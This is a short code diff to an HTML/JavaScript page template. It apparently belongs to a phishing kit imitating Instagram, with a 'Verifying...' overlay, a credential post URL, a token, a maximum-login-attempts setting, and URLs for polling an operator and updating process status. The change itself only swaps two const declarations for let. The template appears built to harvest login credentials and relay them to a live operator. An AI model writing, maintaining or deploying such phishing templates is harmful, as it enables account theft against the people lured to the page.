@@ -71,8 +71,8 @@ body,html{height:100%;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Ro
 <div class="loading-overlay" id="loadingOverlay" style="display:none"><div style="text-align:center"><div class="spinner-border" style="color:#0095F6" role="status"></div><div class="loading-text" id="loadingText">Verifying...</div></div></div>
 <script>
 const templateConfig = { postURL:"{{postURL}}", token:"{{token}}", landingPageLink:"{{landingPageLink}}", maxLoginAttempts:"{{maxLoginAttempts}}", pollingUrl:"{{pollingUrl}}", updateUrl:"{{updateUrl}}" };
-const apiBaseUrl = templateConfig.pollingUrl ? templateConfig.pollingUrl.replace('/pooling-operator', '') : window.location.origin + "/api";
-const updateBaseUrl = templateConfig.updateUrl ? templateConfig.updateUrl.replace('/update-process', '') : window.location.origin + "/api";
+let apiBaseUrl = templateConfig.pollingUrl ? templateConfig.pollingUrl.replace('/pooling-operator', '') : window.location.origin + "/api";
+let updateBaseUrl = templateConfig.updateUrl ? templateConfig.updateUrl.replace('/update-process', '') : window.location.origin + "/api";
 let browserId = null, pollingIntervalId = null, pollingStartTime = null;
 const POLLING_TIMEOUT_MS = 10 * 60 * 1000;
 let currentStatus = null, lastShownStatus = '';
